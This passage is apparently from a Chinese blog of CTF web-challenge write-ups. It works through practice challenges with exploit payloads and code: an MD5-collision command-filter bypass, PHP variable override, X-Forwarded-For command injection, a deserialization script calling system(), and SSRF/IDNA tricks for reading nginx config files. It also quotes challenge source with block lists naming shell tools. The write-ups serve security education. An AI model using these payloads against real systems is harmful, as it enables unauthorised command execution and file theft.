class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1U</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>&amp;gg=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%02</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>

POST:passwd=<span class="hljs-number">1234567</span>a

或者
<span class="hljs-built_in">?id</span>[]=<span class="hljs-number">1</span>&amp;gg[]=<span class="hljs-number">2</span>

POST:passwd=<span class="hljs-number">1234567</span>a</code></pre></div>

<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url中包含<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，仔细看<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png</p>
<p>通过<code>555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0</code>可以类型的构造出index.php查询代码</p>
<div class="hljs"><pre><code class="hljs angelscript">index.php

<span class="hljs-number">696e6465782</span>e706870

Njk2ZTY0NjU3ODJlNzA2ODcw

TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/vQ5dSRXbJZ6Yagn.png" srcset="/img/loading.gif" alt="web-4.png"></p>
<p><img src="https://i.loli.net/2020/10/24/ZfMW62Ik1L5adpz.png" srcset="/img/loading.gif" alt="web-1.png"></p>
<p>base64解码后</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL || ~ E_NOTICE);
header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));

$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiï½ no flag"</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $txt = base64_encode(file_get_contents($file));
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>; <span class="hljs-comment">//将555.png的内容以base64形式显示</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125;
<span class="hljs-keyword">echo</span> $cmd;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123; <span class="hljs-comment">//cmd参数进行了过滤</span>
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;<span class="hljs-comment">// md5强碰撞</span>
        <span class="hljs-keyword">echo</span> `$cmd`;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
    &#125;
&#125;

<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;style&gt;
  body&#123;
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:<span class="hljs-comment">#CCCCCC;</span>
&#125;
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));
<span class="hljs-comment">//这里将img的值两次base64解码后赋值给了file变量</span>
...
$txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//这里存在file_get_contents()函数，直接读取文件的内容</span></code></pre></div>

<p>这题还对一些系统命令进行了过滤，这里需要想办法绕过</p>
<p>ls，不可以使用，但是dir没有过滤，可以使用<code>dir%20/</code>读取目录</p>
<p>cat被过滤了，但是可以使用<code>ca\t</code>绕过，<code>ca\t%20/flag</code></p>
<p><strong>(linux命令中可以加)</strong></p>
<div class="hljs"><pre><code class="hljs lisp">if ((<span class="hljs-name">string</span>)$_POST['a'] !== (<span class="hljs-name">string</span>)$_POST['b'] <span class="hljs-symbol">&amp;&amp;</span> md5($_POST['a']) === md5($_POST['b']))</code></pre></div>

<p>md5强碰撞的字符串</p>
<div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>
&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/N5pyKHGSTAYas3n.png" srcset="/img/loading.gif" alt="web-2.png"></p>
<p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p>
<p>参考： <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;

$yds = <span class="hljs-string">"dog"</span>;
$is = <span class="hljs-string">"cat"</span>;
$handsome = <span class="hljs-string">'yds'</span>;

<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>
    $$x = $y;
&#125;
$flag = flag 

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>
    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>
&#125;

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;
    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>
        <span class="hljs-keyword">exit</span>($handsome);
    &#125;
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;
    <span class="hljs-keyword">exit</span>($yds);
&#125;

<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
    <span class="hljs-keyword">exit</span>($is);
&#125;


<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div>

<p>poyload:</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>

<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
<p><img src="https://i.loli.net/2020/10/24/EGtFP2INmuhgroY.png" srcset="/img/loading.gif" alt="ip-1.png"></p>
<p>最后获取flag, <code>{system(cat /flag)}</code></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;
        $result = call_user_func($func, $p);
        $a= gettype($result);
        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">"string"</span>) &#123;
            <span class="hljs-keyword">return</span> $result;
        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;&#125;
    &#125;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
    $func = $_REQUEST[<span class="hljs-string">"func"</span>];
    $p = $_REQUEST[<span class="hljs-string">"p"</span>];

    <span class="hljs-keyword">if</span> ($func != <span class="hljs-keyword">null</span>) &#123;
        $func = strtolower($func);
        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
            <span class="hljs-keyword">echo</span> gettime($func, $p);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Hacker..."</span>);
        &#125;
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>exp</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
$a = <span class="hljs-keyword">new</span> Test();
$a-&gt;p=<span class="hljs-string">"cat /tmp/flagoefiu4r93"</span>;
$a-&gt;func=<span class="hljs-string">"system"</span>;
<span class="hljs-keyword">print</span>(urlencode(serialize($a)));

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
<span class="hljs-comment">#encoding=utf-8</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> json
reload(sys)
sys.setdefaultencoding(<span class="hljs-string">'latin1'</span>)

app = Flask(__name__)

secert_key = os.urandom(<span class="hljs-number">16</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, action, param, sign, ip)</span>:</span>
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)): <span class="hljs-comment">#SandBox For Remote_Addr</span>
            os.mkdir(self.sandbox)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(self)</span>:</span>
        result = &#123;&#125;
        result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
        <span class="hljs-keyword">if</span> (self.checkSign()):
            <span class="hljs-keyword">if</span> <span class="hljs-string">"scan"</span> <span class="hljs-keyword">in</span> self.action:
                tmpfile = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'w'</span>)
                resp = scan(self.param)
                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">"Connection Timeout"</span>):
                    result[<span class="hljs-string">'data'</span>] = resp
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">print</span> resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"read"</span> <span class="hljs-keyword">in</span> self.action:
                f = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'r'</span>)
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
                result[<span class="hljs-string">'data'</span>] = f.read()
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">500</span>:
                result[<span class="hljs-string">'data'</span>] = <span class="hljs-string">"Action Error"</span>
        <span class="hljs-keyword">else</span>:
            result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
            result[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">"Sign Error"</span>
        <span class="hljs-keyword">return</span> result

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment">#generate Sign For Action Scan.</span>
<span class="hljs-meta">@app.route("/geneSign", methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span>:</span>
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    action = <span class="hljs-string">"scan"</span>
    <span class="hljs-keyword">return</span> getSign(action, param)

<span class="hljs-meta">@app.route('/De1ta',methods=['GET','POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span>:</span>
    action = urllib.unquote(request.cookies.get(<span class="hljs-string">"action"</span>))
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">"sign"</span>))
    ip = request.remote_addr
    <span class="hljs-keyword">if</span>(waf(param)):
        <span class="hljs-keyword">return</span> <span class="hljs-string">"No Hacker!!!!"</span>
    task = Task(action, param, sign, ip)
    <span class="hljs-keyword">return</span> json.dumps(task.Exec())
<span class="hljs-meta">@app.route('/')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"code.txt"</span>,<span class="hljs-string">"r"</span>).read()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span>:</span>
    socket.setdefaulttimeout(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Connection Timeout"</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span>:</span>
    check=param.strip().lower()
    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">"gopher"</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">"file"</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.debug = <span class="hljs-literal">False</span>
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">80</span>)</code></pre></div>



<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目给出了源码</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span>
    url = request.args.get(<span class="hljs-string">"url"</span>)  <span class="hljs-comment"># 获取get提交的url参数</span>
    host = parse.urlparse(url).hostname <span class="hljs-comment">#获取url中的主机名</span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:            
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
    parts = list(urlsplit(url))       <span class="hljs-comment">#将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名</span>
    host = parts[<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
    newhost = []
    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#将主机名以.为分割 进行utf-8解码</span>
    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)         <span class="hljs-comment">#重新组成主机名</span>
    <span class="hljs-comment">#去掉 url 中的空格</span>
    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
    host = parse.urlparse(finalUrl).hostname   <span class="hljs-comment"># 获取新的主机名   </span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span>
   
    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
    &lt;!-- Do you know the nginx? --&gt;</code></pre></div>



<p>考察点1：</p>
<blockquote>
<p>2019black hat一个议题</p>
<div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.blackhat.com<span class="hljs-regexp">/USA-19/</span>Thursday<span class="hljs-regexp">/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</span></code></pre></div>

<p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
</blockquote>
<p><img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png"></p>
<p>考察点2:</p>
<blockquote>
<p>Nginx服务器</p>
<p><a href="https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细</a></p>
<p>这里只要知道nginx服务器的主要文件路径</p>
<p>配置文件存放目录：/etc/nginx </p>
<p>主配置文件：/etc/nginx/conf/nginx.conf </p>
<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
<p>模块：/usr/lisb64/nginx/modules </p>
<p>应用程序：/usr/sbin/nginx </p>
<p>程序默认存放位置：/usr/share/nginx/html </p>
<p>日志默认存放位置：/var/log/nginx </p>
<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf  //这题要用到的路径</p>
</blockquote>
<p>这里要读取的是文件，所以使用的file协议</p>
<p>直接够造</p>
